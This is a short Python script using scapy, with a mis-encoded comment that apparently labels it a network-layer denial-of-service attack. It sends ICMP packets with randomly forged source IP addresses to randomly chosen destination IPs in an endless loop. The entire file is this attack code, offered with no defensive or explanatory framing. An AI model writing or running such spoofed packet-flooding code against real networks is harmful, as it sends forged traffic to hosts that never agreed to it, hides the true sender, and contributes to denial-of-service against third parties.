# ÍøÂç²ã¾Ü¾ø·þÎñ¹¥»÷
from scapy.all import  *
import time
from random import randint
def main():
    while 1:
        pdst = "%i.%i.%i.%i"%(randint(1,254),randint(1,254),randint(1,254),randint(1,254))
        psrc = "%i.%i.%i.%i" % (randint(1, 254), randint(1, 254), randint(1, 254), randint(1, 254))
        # print(pdst)
        packet = IP(dst=pdst,src=psrc)/ICMP()
        send(packet)
        time.sleep(0.5)
        print(packet.summary())
if __name__ == '__main__':
    main()